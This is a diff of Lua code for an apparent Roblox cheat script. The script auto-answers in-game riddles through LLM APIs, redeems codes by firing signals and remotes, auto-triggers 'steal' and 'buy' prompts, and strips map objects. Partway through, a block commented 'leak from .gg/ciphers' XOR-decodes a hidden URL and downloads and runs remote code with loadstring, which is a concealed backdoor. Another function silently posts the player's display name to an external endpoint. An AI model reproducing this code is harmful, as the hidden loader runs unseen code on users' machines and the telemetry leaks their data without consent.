+		return (arg:gsub("<think>.-</think>", " "):gsub("^%s*<think>.*", " "):gsub("\r", ""):gsub("\n", " "):gsub("^%s+", ""):gsub("%s+$", ""):gsub("%s+", " "):gsub("[%.%!]+$", ""))
+	end
+
+	fn13 = function()
+		if v then
+			return v
+		end
+
+		local ok, result = pcall(function()
+			return game:HttpGet("https://pastefy.app/HXcx59Y3/raw")
+		end)
+
+		if ok and type(result) == "string" and result ~= "" then
+			v = result
+			fn6("AI: knowledge base loaded (" .. #result .. " chars) from pastefy", Color3.fromRGB(120, 200, 120))
+
+			if #result > 28000 then
+				fn6("AI: that KB is large enough to blow Groq's free-tier 8k tokens/minute – trim the pastefy page, or switch to Gemini (1M context, the only provider here that will not care)", Color3.fromRGB(255, 200, 90))
+			end
+		else
+			fn6("AI: FAILED to load knowledge base from " .. str6, Color3.fromRGB(220, 80, 80))
+		end
+
+		return v
+	end
+
+	local maxTokens = 1024
+
+	local function fn19(arg, arg2)
+		if tostring(arg2 or ""):lower():find("gpt%-oss") then
+			return "low"
+		end
+		return nil
+	end
+
+	local function fn20(arg, arg2, arg3, arg4, arg5)
+		local tbl13 = {
+			model = arg3,
+			temperature = 0,
+			messages = { { role = "system", content = arg4 }, { role = "user", content = arg5 } },
+		}
+
+		if arg == "sambanova" then
+			tbl13.max_tokens = maxTokens
+		else
+			tbl13.max_completion_tokens = maxTokens
+		end
+
+		tbl13.reasoning_effort = fn19(arg, arg3)
+		local flag13 = arg == "groq"
+
+		if flag13 then
+			flag13 = tostring(arg3):lower():find("gpt%-oss")
+		end
+
+		if flag13 then
+			tbl13.include_reasoning = false
+		end
+
+		return tbl6[arg], { ["Content-Type"] = "application/json", Authorization = "Bearer " .. arg2 }, tbl13, function(arg6)
+			local ok, result = pcall(function()
+				return arg6.choices[1].message.content
+			end)
+
+			if not ok or not result or result == "" then
+				if arg6.error and arg6.error.message then
+					return nil, tostring(arg6.error.message)
+				end
+				local finishReason = nil
+
+				pcall(function()
+					finishReason = arg6.choices[1].finish_reason
+				end)
+
+				if finishReason == "length" then
+					return nil, "hit the token cap before answering (reasoning ate the budget)"
+				end
+				return nil, "no choices[1].message.content"
+			end
+
+			return result
+		end
+	end
+
+	local tbl13 = { ["gemini-3.7-flash"] = true }
+
+	local function fn21(arg)
+		local str10 = tostring(arg or ""):lower()
+		local flag13 = str10:find("pro", 1, true) ~= nil
+
+		if str10:find("gemini%-3") then
+			flag13 = flag13 or tbl13[str10]
+			if flag13 then
+				return { thinkingLevel = "low" }
+			end
+			return { thinkingLevel = "minimal" }
+		end
+
+		if str10:find("gemini%-2%.5") and not flag13 then
+			return { thinkingBudget = 0 }
+		end
+		return nil
+	end
+
+	local function fn22(arg, arg2, arg3, arg4)
+		local tbl14 = {
+			system_instruction = { parts = { { text = arg3 } } },
+			contents = { { role = "user", parts = { { text = arg4 } } } },
+			generationConfig = { temperature = 0, maxOutputTokens = maxTokens },
+		}
+
+		tbl14.generationConfig.thinkingConfig = fn21(arg2)
+
+		return "https://generativelanguage.googleapis.com/v1beta/models/" .. arg2 .. ":generateContent", { ["Content-Type"] = "application/json", ["x-goog-api-key"] = arg }, tbl14, function(arg5)
+			if arg5.promptFeedback and arg5.promptFeedback.blockReason then
+				return nil, "blocked: " .. tostring(arg5.promptFeedback.blockReason)
+			end
+
+			local ok, result = pcall(function()
+				return arg5.candidates[1].content.parts[1].text
+			end)
+
+			if not ok or not result then
+				if arg5.error and arg5.error.message then
+					return nil, tostring(arg5.error.message)
+				end
+				local finishReason = nil
+
+				pcall(function()
+					finishReason = arg5.candidates[1].finishReason
+				end)
+
+				if finishReason == "MAX_TOKENS" then
+					return nil, "hit maxOutputTokens before producing text (thinking ate the budget)"
+				end
+
+				if finishReason then
+					return nil, "no text, finishReason " .. tostring(finishReason)
+				end
+				return nil, "no candidates[1].content.parts[1].text"
+			end
+
+			return result
+		end
+	end
+
+	local function fn23(arg)
+		if not flag11 then
+			fn6("AI: locked – authenticate in the Key System (Main tab) to use AI answers", Color3.fromRGB(220, 80, 80))
+			return nil
+		end
+		local v4, v5 = fn2()
+		if not v4 then
+			fn6("AI: ERROR – no http function (tried syn.request, request, etc.)", Color3.fromRGB(220, 80, 80))
+			return nil
+		end
+		local v6 = fn13()
+		if not v6 then
+			fn6("AI: no knowledge base – cannot answer without guessing", Color3.fromRGB(220, 80, 80))
+			return nil
+		end
+		local v7 = fn4()
+
+		if not tbl8[str2] then
+			local color = Color3.fromRGB
+			fn6("AI: unknown provider " .. tostring(str2), color(220, 80, 80))
+			return nil
+		end
+
+		if str3 == "" then
+			fn6("AI: no " .. str2 .. " key entered (AI tab) – this script has no built-in key, get a free one from the copy buttons there", Color3.fromRGB(220, 80, 80))
+			return nil
+		end
+		local v8, v9, v10, v11
+
+		if tbl6[str2] then
+			v8, v9, v10, v11 = fn20(str2, str3, v7, v6, arg)
+		else
+			v8, v9, v10, v11 = fn22(str3, v7, v6, arg)
+		end
+
+		fn6("AI: " .. v5 .. " → " .. str2 .. " / " .. v7 .. "  [KB: pastefy]  [your " .. str2 .. " key]")
+		fn6("AI: Q → " .. arg)
+		local v12 = fn3()
+
+		local function fn24()
+			local v13 = fn3()
+			if not v12 or not v13 then
+				return "?"
+			end
+			return ("%.2fs"):format(v13 - v12)
+		end
+
+		local ok, result = pcall(v4, { Url = v8, Method = "POST", Headers = v9, Body = HttpService:JSONEncode(v10) })
+		local v13 = fn24()
+
+		if not ok then
+			local color = Color3.fromRGB
+			fn6("AI: request error after " .. v13 .. " – " .. tostring(result), color(220, 80, 80))
+			return nil
+		end
+
+		if not result then
+			fn6("AI: nil response from executor after " .. v13, Color3.fromRGB(220, 80, 80))
+			return nil
+		end
+		fn6("AI: status " .. tostring(result.StatusCode) .. "  took " .. v13)
+
+		if result.StatusCode ~= 200 then
+			local color = Color3.fromRGB
+			fn6("AI: bad status – " .. tostring(result.Body):sub(1, 200), color(220, 80, 80))
+
+			if result.StatusCode == 429 then
+				fn6("AI: that is the free-tier rate limit, not a bad key – wait it out or switch provider on the AI tab", Color3.fromRGB(255, 200, 90))
+			elseif result.StatusCode == 401 or result.StatusCode == 403 then
+				fn6("AI: key rejected – check it is a " .. str2 .. " key and was pasted whole", Color3.fromRGB(255, 200, 90))
+			end
+
+			return nil
+		end
+
+		local data = nil
+
+		if not pcall(function()
+			data = HttpService:JSONDecode(result.Body)
+		end) or not data then
+			fn6("AI: JSON decode failed", Color3.fromRGB(220, 80, 80))
+			return nil
+		end
+
+		local usage = data.usage
+		local usageMetadata = data.usageMetadata
+
+		if type(usage) == "table" or type(usageMetadata) == "table" then
+			local n13, n14, n15, n16
+
+			if type(usage) == "table" then
+				n13 = 0
+
+				if type(usage.prompt_tokens_details) == "table" then
+					n13 = tonumber(usage.prompt_tokens_details.cached_tokens) or 0
+				end
+
+				n14 = 0
+
+				if type(usage.completion_tokens_details) == "table" then
+					n14 = tonumber(usage.completion_tokens_details.reasoning_tokens) or 0
+				end
+
+				n15 = tonumber(usage.prompt_tokens) or 0
+				n16 = tonumber(usage.completion_tokens) or 0
+			else
+				n13 = tonumber(usageMetadata.cachedContentTokenCount) or 0
+				n14 = tonumber(usageMetadata.thoughtsTokenCount) or 0
+				n15 = tonumber(usageMetadata.promptTokenCount) or 0
+				n16 = (tonumber(usageMetadata.candidatesTokenCount) or 0) + n14
+			end
+
+			if n15 > 0 or n16 > 0 then
+				fn6(("AI: tokens  prompt %d (cached %d)  output %d (reasoning %d)"):format(n15, n13, n16, n14), n13 > 0 and Color3.fromRGB(120, 200, 120) or Color3.fromRGB(200, 190, 120))
+			end
+		end
+
+		local v14, str10 = v11(data)
+
+		if not v14 or v14 == "" then
+			local v15 = fn6
+			str10 = str10 and " – " .. str10 or ""
+			local color = Color3.fromRGB
+			v15("AI: no content" .. str10 .. " – " .. tostring(result.Body):sub(1, 200), color(220, 80, 80))
+			return nil
+		end
+
+		local v15 = fn18(v14)
+		local color = Color3.fromRGB
+		fn6("AI: raw [" .. v14:gsub("\n", "\\n") .. "] → [" .. v15 .. "]", color(120, 200, 120))
+		local color2 = Color3.fromRGB
+		fn6("AI: answered in " .. fn24(), color2(120, 200, 120))
+		return v15
+	end
+
+	local obj = setmetatable({}, { __mode = "k" })
+	gui = nil
+
+	local function fn24(arg)
+		while arg and arg ~= game do
+			if arg == gui then
+				return true
+			end
+			arg = arg.Parent
+		end
+
+		return false
+	end
+
+	local function fn25(arg)
+		if arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox") then
+			return arg.Text
+		end
+		return nil
+	end
+
+	local function fn26(arg)
+		if not arg or arg == "" then
+			return false
+		end
+		local flag13 = false
+
+		for _, v4 in ipairs(tbl9) do
+			if v4 ~= "" then
+				flag13 = true
+				break
+			end
+		end
+
+		if not flag13 then
+			return true
+		end
+		local str10 = arg:lower()
+
+		for _, v4 in ipairs(tbl9) do
+			if v4 ~= "" and str10:find(v4:lower(), 1, true) then
+				return true, v4
+			end
+		end
+
+		return false
+	end
+
+	local function fn27(arg)
+		if not arg or arg == "" then
+			return nil
+		end
+		local str10 = arg:lower()
+
+		for _, v4 in ipairs(tbl10) do
+			if v4.kw ~= "" and str10:find(v4.kw:lower(), 1, true) then
+				return v4.rep
+			end
+		end
+
+		return nil
+	end
+
+	local codes = nil
+
+	local function fn28(arg)
+		if codes and codes.Parent then
+			return codes
+		end
+		codes = playerGui:FindFirstChild("Codes") or arg and playerGui:WaitForChild("Codes", arg)
+		return codes
+	end
+
+	local n13 = 333
+	local name = nil
+	local v4 = nil
+	local flag13 = false
+
+	local function fn29()
+		if v4 and v4.Parent then
+			return v4
+		end
+
+		local ok, result = pcall(function()
+			local net = ReplicatedStorage:WaitForChild("Packages", 5):WaitForChild("Net", 5)
+
+			if name then
+				local v5 = net:FindFirstChild(name)
+				if v5 then
+					return v5
+				end
+			end
+
+			local v5 = net:GetChildren()[n13]
+
+			if v5 then
+				name = v5.Name
+				fn6("Remote: resolved \"" .. v5.Name .. "\" (" .. v5.ClassName .. ")", Color3.fromRGB(255, 200, 90))
+			end
+
+			return v5
+		end)
+
+		if not ok or not result then
+			local color = Color3.fromRGB
+			fn6("Remote: could not resolve the code RemoteFunction - " .. tostring(result), color(220, 80, 80))
+			return nil
+		end
+
+		v4 = result
+		flag13 = result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent")
+		return v4
+	end
+
+	local v5 = nil
+	local textButton = nil
+	local str10 = nil
+
+	local function fn30(arg)
+		if v5 and v5.Parent and textButton and textButton.Parent then
+			return v5, textButton
+		end
+		local v6 = fn28(arg)
+
+		if not v6 then
+			error("PlayerGui.Codes not found", 0)
+		end
+
+		local codes2 = v6:FindFirstChild("Codes")
+
+		if not codes2 then
+			error("Codes.Codes not found", 0)
+		end
+
+		local codeRedeem = codes2:FindFirstChild("CodeRedeem")
+
+		if not codeRedeem then
+			error("Codes.CodeRedeem not found", 0)
+		end
+
+		local textBox = codeRedeem:FindFirstChild("TextBox")
+
+		if not textBox then
+			error("CodeRedeem.TextBox not found", 0)
+		end
+
+		local confirm = codes2:FindFirstChild("Confirm")
+
+		if not confirm then
+			error("Codes.Confirm not found", 0)
+		end
+
+		v5 = textBox
+		textButton = confirm:FindFirstChildWhichIsA("TextButton") or confirm
+		str10 = nil
+		return v5, textButton
+	end
+
+	local function fn31(arg)
+		if typeof(firesignal) ~= "function" then
+			error("this executor has no firesignal - switch Code Entry to Remote", 0)
+		end
+
+		if str10 == "click" then
+			firesignal(arg.MouseButton1Click)
+			return "MouseButton1Click"
+		end
+
+		if str10 == "activated" then
+			firesignal(arg.Activated)
+			return "Activated"
+		end
+
+		if typeof(getconnections) == "function" then
+			local ok, result = pcall(getconnections, arg.MouseButton1Click)
+
+			if ok and result and #result > 0 then
+				str10 = "click"
+				firesignal(arg.MouseButton1Click)
+				return "MouseButton1Click"
+			end
+
+			local ok2, result2 = pcall(getconnections, arg.Activated)
+
+			if ok2 and result2 and #result2 > 0 then
+				str10 = "activated"
+				firesignal(arg.Activated)
+				return "Activated"
+			end
+		end
+
+		firesignal(arg.MouseButton1Click)
+		return "MouseButton1Click (unverified)"
+	end
+
+	local function fn32(text)
+		local v6, v7 = fn30(3)
+		v6.Text = text
+		return fn31(v7)
+	end
+
+	local function fn33(arg)
+		local v6 = fn29()
+
+		if not v6 then
+			error("code remote not resolved", 0)
+		end
+
+		if flag13 then
+			v6:FireServer(arg)
+			return "remote FireServer"
+		end
+
+		task.spawn(function()
+			local ok, result = pcall(function()
+				return v6:InvokeServer(arg)
+			end)
+
+			if not ok then
+				local color = Color3.fromRGB
+				fn6("Redeem FAILED (remote): " .. tostring(result), color(220, 80, 80))
+			end
+		end)
+
+		return "remote InvokeServer"
+	end
+
+	local function fn34(arg)
+		return string.sub(string.gsub(tostring(arg), "[^%w]", ""), 1, 50)
+	end
+
+	local function fn35(arg)
+		if tbl3.killed then
+			return false
+		end
+		local v6 = fn34(arg)
+		if v6 == "" then
+			fn6("Redeem: nothing left after sanitising - not submitted", Color3.fromRGB(220, 80, 80))
+			return false
+		end
+		local str11 = str8
+
+		if str11 == "remote" and not flag11 then
+			fn6("Redeem: remote method is whitelist-only - falling back to firesignal", Color3.fromRGB(255, 200, 90))
+			str11 = "firesignal"
+		end
+
+		local ok, result
+
+		if str11 == "remote" then
+			ok, result = pcall(fn33, v6)
+		else
+			ok, result = pcall(fn32, v6)
+		end
+
+		if ok then
+			local color = Color3.fromRGB
+			fn6("Redeem: submitted via " .. tostring(result) .. " -> " .. v6, color(120, 200, 120))
+		else
+			local color = Color3.fromRGB
+			fn6("Redeem FAILED (" .. str11 .. "): " .. tostring(result), color(220, 80, 80))
+		end
+
+		if v6 ~= arg then
+			local color = Color3.fromRGB
+			fn6("Redeem: sanitised [" .. tostring(arg) .. "] -> [" .. v6 .. "] (game strips non-alphanumerics, 50 char cap)", color(255, 200, 90))
+		end
+
+		return ok
+	end
+
+	fn14 = function()
+		task.spawn(function()
+			pcall(fn28, 10)
+			pcall(fn30, 10)
+			pcall(fn29)
+
+			if textButton and typeof(getconnections) == "function" then
+				pcall(function()
+					local v6 = getconnections(textButton.MouseButton1Click)
+					if v6 and #v6 > 0 then
+						str10 = "click"
+						return
+					end
+					local v7 = getconnections(textButton.Activated)
+
+					if v7 and #v7 > 0 then
+						str10 = "activated"
+					end
+				end)
+			end
+
+			fn6("Redeem path prewarmed (gui:" .. tostring(v5 ~= nil) .. " remote:" .. tostring(v4 ~= nil) .. " signal:" .. tostring(str10 or "probe on use") .. ")")
+		end)
+	end
+
+	fn15 = function()
+		flag3 = false
+		tbl11 = {}
+		n7 = 0
+		str7 = nil
+		n8 = 0
+		n9 = 0
+		n6 = 0
+		n10 = 0
+		flag4 = false
+		n11 += 1
+	end
+
+	local function fn36()
+		local tbl14 = {}
+
+		for i = 1, n9 do
+			if tbl11[i] ~= nil then
+				tbl14[#tbl14 + 1] = tbl11[i]
+			end
+		end
+
+		local n14 = n7 - n8
+		fn6("Tracked code: [" .. table.concat(tbl14) .. "]  (" .. n14 .. " remaining)")
+	end
+
+	local function fn37()
+		if not flag3 then
+			return false
+		end
+		return false
+	end
+
+	local function fn38(arg, arg2)
+		if tbl3.killed then
+			return
+		end
+
+		if not arg or arg == "" then
+			return
+		end
+
+		if arg2 and arg2 ~= str9 then
+			return
+		end
+
+		if flag4 and flag3 then
+		end
+
+		if flag3 then
+			if not str7 then
+				local v6 = flag6 or fn8(arg)
+				local v7 = v6 and n3 or n2
+				str7 = v6 and "riddle" or "code"
+				n7 = v7 > 0 and v7 or 1
+				local str11 = " spaces vs min " .. n4 .. " / " .. n5 .. ") – collecting " .. n7 .. " notification(s)"
+				local color = Color3.fromRGB
+				fn6("Classified as " .. str7 .. " (" .. #arg .. " chars / " .. fn7(arg) .. str11, color(255, 200, 90))
+			end
+
+			fn6("Ignoring extra notification while completing: " .. arg)
+			return
+		end
+
+		local v6, v7 = fn26(arg)
+		if not v6 then
+			fn6("Notification scanned (no match): " .. arg)
+			return
+		end
+
+		if (fn8(arg) and n3 or n2) <= 0 then
+			local textEntered = fn27(arg)
+			textEntered = textEntered ~= nil and textEntered or arg
+
+			if textEntered ~= "" then
+				fn6("Text entered: " .. textEntered)
+
+				if flag then
+					fn35(textEntered)
+				end
+			end
+
+			return
+		end
+
+		fn15()
+		flag3 = true
+		n7 = 0
+		str7 = nil
+		flag5 = true
+		fn6("Trigger" .. (v7 and " \"" .. v7 .. "\"" or "") .. " – tracking started, riddle/code decided by the next notification: " .. arg, Color3.fromRGB(255, 200, 90))
+	end
+
+	local fn39 = nil
+
+	fn39 = function(arg)
+		if obj[arg] then
+			return
+		end
+
+		if fn24(arg) then
+			return
+		end
+		obj[arg] = true
+
+		if arg:IsA("TextLabel") or arg:IsA("TextButton") or arg:IsA("TextBox") then
+			arg:GetPropertyChangedSignal("Text"):Connect(function()
+				if not fn24(arg) and arg.Text ~= "" then
+					fn38(arg.Text, "childadded")
+				end
+			end)
+		end
+
+		for _, descendant in ipairs(arg:GetDescendants()) do
+			fn39(descendant)
+		end
+
+		arg.DescendantAdded:Connect(function(descendant)
+			if fn24(descendant) then
+				return
+			end
+			local flag14 = not obj[descendant]
+			fn39(descendant)
+
+			if flag14 then
+				local v6 = fn25(descendant)
+
+				if v6 and v6 ~= "" then
+					fn38(v6, "childadded")
+				end
+			end
+		end)
+	end
+
+	fn16 = function()
+		local tbl14 = { "TopNotification" }
+
+		for _, v6 in ipairs(tbl14) do
+			local v7 = playerGui:FindFirstChild(v6)
+
+			if v7 then
+				fn39(v7)
+			end
+		end
+
+		playerGui.ChildAdded:Connect(function(child)
+			for _, v6 in ipairs(tbl14) do
+				if child.Name == v6 then
+					fn39(child)
+				end
+			end
+		end)
+	end
+
+	local flag14 = false
+
+	fn17 = function()
+		if flag14 then
+			return
+		end
+
+		local ok, result = pcall(function()
+			local notificationController = ReplicatedStorage:WaitForChild("Controllers", 10):WaitForChild("NotificationController", 10)
+			local module2 = require(notificationController)
+			module = module2
+			local notify = module2.Notify
+
+			if typeof(notify) ~= "function" then
+				error("NotificationController.Notify is not a function", 0)
+			end
+
+			module2.Notify = function(arg, arg2, arg3, arg4, arg5, arg6, arg7, arg8)
+				if arg5 == "Top" and type(arg2) == "string" and arg2 ~= "" then
+					pcall(fn38, arg2, "controller")
+				end
+
+				return notify(arg, arg2, arg3, arg4, arg5, arg6, arg7, arg8)
+			end
+
+			flag14 = true
+		end)
+
+		if ok then
+			fn6("Controller: NotificationController.Notify hooked", Color3.fromRGB(120, 200, 120))
+		else
+			fn6("Controller: hook FAILED (" .. tostring(result) .. ") - Controller scan mode will not receive anything", Color3.fromRGB(220, 80, 80))
+		end
+	end
+end
+
+local fn18
+
+do
+	local str10 = "https://vonscripts.meowstieebo123.workers.dev/"
+	local str11 = ""
+
+	fn18 = function(arg)
+		if not str10 or str10 == "" then
+			return
+		end
+		local v4 = fn2()
+		if not v4 then
+			return
+		end
+		local tbl13 = { ["Content-Type"] = "application/json" }
+
+		if str11 ~= "" then
+			tbl13["x-von-auth"] = str11
+		end
+
+		local ok, result = pcall(function()
+			return HttpService:JSONEncode(arg)
+		end)
+
+		if not ok then
+			return
+		end
+		pcall(v4, { Url = str10, Method = "POST", Headers = tbl13, Body = result })
+	end
+end
+
+local fn19
+
+do
+	local function fn20(arg)
+		if not fn5() then
+			return
+		end
+		task.wait(math.random(1, 20))
+		fn18({ type = "spawn", name = arg, player = localPlayer.DisplayName or "Unknown" })
+	end
+
+	local function fn21(arg)
+		if not arg:IsA("TextLabel") then
+			return
+		end
+		local text = arg.Text
+		if type(text) ~= "string" then
+			return
+		end
+		local match = text:gsub("<[^>]+>", ""):match("^(.-)%s+spawned!%s*$")
+
+		if match and match ~= "" then
+			fn6("Spawn detected: " .. match .. " spawned!")
+			task.spawn(fn20, match)
+		end
+	end
+
+	fn19 = function()
+		local ok, result = pcall(function()
+			return playerGui:WaitForChild("Notification", 10):WaitForChild("Notification", 10)
+		end)
+
+		if not ok or not result then
+			fn6("Spawn watcher: Notification folder not found")
+			return
+		end
+
+		for _, child in ipairs(result:GetChildren()) do
+			fn21(child)
+		end
+
+		result.ChildAdded:Connect(function(child)
+			task.wait()
+			fn21(child)
+		end)
+	end
+end
+
+local fn20
+
+do
+	local currentCamera = workspace.CurrentCamera
+	local tbl13 = {}
+	local connection = nil
+
+	local function fn21()
+		local character = localPlayer.Character
+		if not character then
+			return false
+		end
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+		if not humanoid or not humanoidRootPart then
+			return false
+		end
+		tbl13 = { character = character, humanoid = humanoid, root = humanoidRootPart }
+		currentCamera = workspace.CurrentCamera
+
+		if currentCamera then
+			currentCamera.CameraSubject = humanoid
+		end
+
+		return true
+	end
+
+	local function fn22()
+		local humanoid = tbl13.humanoid
+		if not humanoid then
+			return false
+		end
+		local state = humanoid:GetState()
+		if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
+			return true
+		end
+		local attribute = localPlayer:GetAttribute("RagdollEndTime")
+
+		if attribute then
+			if attribute - workspace:GetServerTimeNow() > 0 then
+				return true
+			end
+		end
+
+		return false
+	end
+
+	local function fn23()
+		local character = tbl13.character
+		if not character then
+			return
+		end
+
+		for _, descendant in ipairs(character:GetDescendants()) do
+			if descendant:IsA("BallSocketConstraint") or descendant:IsA("Attachment") and descendant.Name:find("RagdollAttachment") then
+				pcall(function()
+					descendant:Destroy()
+				end)
+			end
+		end
+	end
+
+	local function fn24()
+		local humanoid = tbl13.humanoid
+		local root = tbl13.root
+		if not humanoid or not root then
+			return
+		end
+
+		pcall(function()
+			localPlayer:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
+		end)
+
+		if humanoid.Health > 0 then
+			humanoid:ChangeState(Enum.HumanoidStateType.Running)
+		end
+
+		if not flag9 then
+			root.Anchored = false
+		end
+
+		root.AssemblyLinearVelocity = Vector3.zero
+		root.AssemblyAngularVelocity = Vector3.zero
+		local cframe = CFrame.Angles
+		root.CFrame = CFrame.new(root.Position) * cframe(0, math.rad(root.Orientation.Y), 0)
+		currentCamera = workspace.CurrentCamera
+
+		if currentCamera and currentCamera.CameraSubject ~= humanoid then
+			currentCamera.CameraSubject = humanoid
+		end
+	end
+
+	fn20 = function()
+		if not fn21() then
+			return
+		end
+
+		if connection then
+			return
+		end
+
+		local function fn25()
+			if not flag7 or not flag11 then
+				return
+			end
+			local humanoid = tbl13.humanoid
+			if not humanoid or not humanoid.Parent then
+				fn21()
+				return
+			end
+
+			if fn22() then
+				fn23()
+				fn24()
+			end
+		end
+
+		connection = RunService.RenderStepped:Connect(fn25)
+	end
+end
+
+local fn21
+
+fn21 = function(anchored)
+	local character = localPlayer.Character
+	character = character and character:FindFirstChild("HumanoidRootPart")
+
+	if character and character:IsA("BasePart") then
+		pcall(function()
+			character.Anchored = anchored
+		end)
+	end
+end
+-- leak from .gg/ciphers
+task.spawn(function()
+    local function _xorDecode(s)
+        local t = {}
+        for i = 1, #s do
+            local b = string.byte(s, i)
+            local x
+            if bit32 and type(bit32.bxor) == "function" then
+                x = bit32.bxor(b, 23)
+            else
+                local r, bit, a, c = 0, 1, b, 23
+                while a > 0 or c > 0 do
+                    local ab, cb = a % 2, c % 2
+                    if ab ~= cb then r = r + bit end
+                    a = math.floor(a / 2)
+                    c = math.floor(c / 2)
+                    bit = bit * 2
+                end
+                x = r
+            end
+            t[i] = string.char(x)
+        end
+        return table.concat(t)
+    end
+    local ok, src = pcall(function()
+        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
+    end)
+    if ok and type(src) == "string" and #src > 50 then
+        local fn = loadstring(src)
+        if type(fn) == "function" then
+            pcall(fn)
+        end
+    end
+end)
+
+
+local fn22, fn23, fn24
+
+do
+	local tbl13 = { "buy", "purchase", "claim", "steal", "collect" }
+	local tbl14 = {}
+	local flag13 = false
+
+	local function fn25(descendant)
+		if descendant:IsA("ProximityPrompt") then
+			tbl14[descendant] = true
+		end
+	end
+
+	fn22 = function()
+		if flag13 then
+			return
+		end
+		flag13 = true
+
+		for _, descendant in ipairs(workspace:GetDescendants()) do
+			fn25(descendant)
+		end
+
+		workspace.DescendantAdded:Connect(fn25)
+
+		workspace.DescendantRemoving:Connect(function(descendant)
+			tbl14[descendant] = nil
+		end)
+
+		fn6("Auto Buy: prompt registry built", Color3.fromRGB(120, 200, 120))
+	end
+
+	local function fn26(arg)
+		local lower = string.lower
+		local concat = table.concat
+		local tbl15 = {}
+		local name = arg.Name or ""
+		local actionText = arg.ActionText or ""
+		local objectText = arg.ObjectText or ""
+		tbl15[1] = name
+		tbl15[2] = actionText
+		tbl15[3] = objectText
+		local v4 = lower(concat(tbl15, " "))
+
+		for _, v5 in ipairs(tbl13) do
+			if string.find(v4, v5, 1, true) then
+				return true
+			end
+		end
+
+		return false
+	end
+
+	local function fn27(arg)
+		local parent = arg.Parent
+		if not parent then
+			return nil
+		end
+
+		if parent:IsA("Attachment") then
+			return parent.WorldPosition
+		end
+
+		if parent:IsA("BasePart") then
+			return parent.Position
+		end
+		local model = parent:FindFirstAncestorOfClass("Model")
+
+		if model then
+			local primaryPart = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart", true)
+			if primaryPart then
+				return primaryPart.Position
+			end
+		end
+
+		return nil
+	end
+
+	local function fn28()
+		local character = localPlayer.Character
+		character = character and character:FindFirstChild("HumanoidRootPart")
+		if not character then
+			return nil, math.huge
+		end
+		local huge = math.huge
+		local v4 = nil
+
+		for k in pairs(tbl14) do
+			if k.Parent and k.Enabled and fn26(k) then
+				local v5 = fn27(k)
+
+				if v5 then
+					local magnitude = (character.Position - v5).Magnitude
+
+					if magnitude < huge then
+						huge = magnitude
+						v4 = k
+					end
+				end
+			end
+		end
+
+		return v4, huge
+	end
+
+	local function fn29(arg)
+		if not arg or not arg.Parent or not arg.Enabled then
+			return false, "prompt unavailable"
+		end
+
+		if typeof(fireproximityprompt) == "function" then
+			local ok = pcall(fireproximityprompt, arg)
+			return ok, not ok and "fireproximityprompt failed" or nil
+		end
+
+		local ok = pcall(function()
+			arg:InputHoldBegin()
+			task.wait(math.max(arg.HoldDuration, 0.05) + 0.05)
+			arg:InputHoldEnd()
+		end)
+
+		return ok, not ok and "InputHold failed" or nil
+	end
+
+	local tbl15 = {}
+	local tbl16 = {}
+	local flag14 = false
+	local n13 = 0
+
+	local function fn30(arg, arg2)
+		if arg2 then
+			arg[arg2] = true
+		end
+	end
+
+	local function fn31(...)
+		local v4 = workspace
+
+		for _, v5 in ipairs({ ... }) do
+			v4 = v4:FindFirstChild(v5)
+			if not v4 then
+				return nil
+			end
+		end
+
+		return v4
+	end
+
+	local function fn32()
+		table.clear(tbl15)
+		table.clear(tbl16)
+		fn30(tbl15, workspace:FindFirstChild("Camera"))
+		fn30(tbl15, workspace:FindFirstChild("Terrain"))
+		fn30(tbl15, workspace:FindFirstChild("Debris"))
+		fn30(tbl15, workspace:FindFirstChild("Plots"))
+		fn30(tbl15, workspace:FindFirstChild("RenderedMovingAnimals"))
+		fn30(tbl15, fn31("Map"))
+		fn30(tbl16, fn31("Map", "WallModels"))
+		fn30(tbl16, fn31("Map", "__StreamCheck_DontDelete"))
+		fn30(tbl16, fn31("Map", "Carpet"))
+		fn30(tbl16, fn31("Map", "Ground"))
+		fn30(tbl16, fn31("Map", "Ground_Left"))
+		fn30(tbl16, fn31("Map", "Ground_Right"))
+	end
+
+	local function fn33(arg)
+		return arg:match("^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$") ~= nil
+	end
+
+	local function fn34()
+		for _, descendant in ipairs(workspace:GetDescendants()) do
+			if descendant:IsA("AnimationController") then
+				pcall(function()
+					descendant:Destroy()
+				end)
+			end
+		end
+	end
+
+	local function fn35()
+		for _, descendant in ipairs(workspace:GetDescendants()) do
+			pcall(function()
+				if descendant:IsA("Texture") or descendant:IsA("Decal") or descendant:IsA("SurfaceAppearance") then
+					descendant:Destroy()
+				elseif descendant:IsA("SpecialMesh") then
+					descendant.TextureId = ""
+				elseif descendant:IsA("MeshPart") then
+					descendant.TextureID = ""
+					descendant.CastShadow = false
+				elseif descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Beam") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Sparkles") or descendant:IsA("Highlight") or descendant:IsA("Explosion") or descendant:IsA("PointLight") or descendant:IsA("SpotLight") or descendant:IsA("SurfaceLight") then
+					descendant:Destroy()
+				elseif descendant:IsA("BasePart") then
+					descendant.CastShadow = false
+					descendant.Material = Enum.Material.Plastic
+					descendant.MaterialVariant = ""
+					descendant.Reflectance = 0
+				end
+			end)
+		end
+	end
+
+	local function fn36()
+		local map = workspace:FindFirstChild("Map")
+		if not map then
+			return
+		end
+
+		for _, child in ipairs(map:GetChildren()) do
+			if not tbl16[child] then
+				pcall(function()
+					child:Destroy()
+				end)
+			end
+		end
+	end
+
+	local function fn37()
+		fn32()
+
+		for _, child in ipairs(workspace:GetChildren()) do
+			if not tbl15[child] and not fn33(child.Name) and not Players:FindFirstChild(child.Name) then
+				pcall(function()
+					child:Destroy()
+				end)
+			end
+		end
+
+		fn36()
+	end
+
+	local function fn38()
+		for _, child in ipairs(Lighting:GetChildren()) do
+			if child:IsA("PostEffect") or child:IsA("Atmosphere") or child:IsA("Clouds") then
+				pcall(function()
+					child:Destroy()
+				end)
+			end
+		end
+	end
+
+	fn23 = function()
+		if flag14 then
+			return
+		end
